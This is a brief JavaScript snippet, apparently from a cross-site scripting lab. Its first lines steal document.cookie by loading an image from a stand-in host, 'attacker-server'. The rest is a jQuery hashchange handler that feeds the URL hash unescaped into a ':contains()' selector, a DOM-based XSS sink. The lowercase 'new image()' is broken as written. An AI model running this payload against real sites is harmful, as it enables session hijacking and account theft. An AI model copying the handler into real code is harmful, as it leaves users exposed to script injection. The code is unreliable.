var img = new image();
img.src = "http://attacker-server/" + document.cookie;

$(window).on("hashchange", function () {
  var post = $(
    "section.blog-list h2:contains(" +
      decodeURIComponent(window.location.hash.slice(1)) +
      ")"
  );
  if (post) post.get(0).scrollIntoView();
});
